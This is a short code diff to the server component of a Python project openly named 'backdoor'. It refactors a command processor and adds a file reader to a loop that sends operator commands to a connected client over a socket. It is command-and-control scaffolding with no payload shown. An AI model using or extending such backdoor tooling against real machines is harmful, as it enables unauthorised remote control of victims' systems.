@@ -2,8 +2,8 @@
 import socket
 
 from backdoor.command.converter import InputToCommandConverter
-from backdoor.command.processor import CommandResultProcessor
-from backdoor.files.io import FileWriter
+from backdoor.command.processor import CommandProcessor
+from backdoor.files.io import FileReader, FileWriter
 from backdoor.messages.exchange.server import ServerExchangeMapper
 from backdoor.messages.messenger import SocketMessenger
 from backdoor.messages.protocol import SocketProtocol
@@ -18,7 +18,7 @@ class Server:
         messenger: SocketMessenger,
         exchanger: ServerExchangeMapper,
         converter: InputToCommandConverter,
-        processor: CommandResultProcessor,
+        processor: CommandProcessor,
         host: str = "localhost",
         port: int = 4567,
     ) -> None:
@@ -36,12 +36,10 @@ class Server:
         self.__read_client_report(client)
 
         while (inp := self.__get_input()) != "exit":
-
             command = self.converter.convert(inp)
-
+            self.processor.pre_process(command)
             result = self.exchanger.exchange(client, command)
-
-            self.processor.process(command, result)
+            self.processor.post_process(command, result)
 
     def __accept_connection(self) -> ClientModel:
         sock, addr = self.socket.accept()
@@ -72,7 +70,8 @@ def main() -> None:
     exchanger = ServerExchangeMapper(messenger)
     converter = InputToCommandConverter()
     file_writer = FileWriter()
-    processor = CommandResultProcessor(file_writer)
+    file_reader = FileReader()
+    processor = CommandProcessor(file_writer, file_reader)
     server = Server(messenger, exchanger, converter, processor)
 
     server.start()
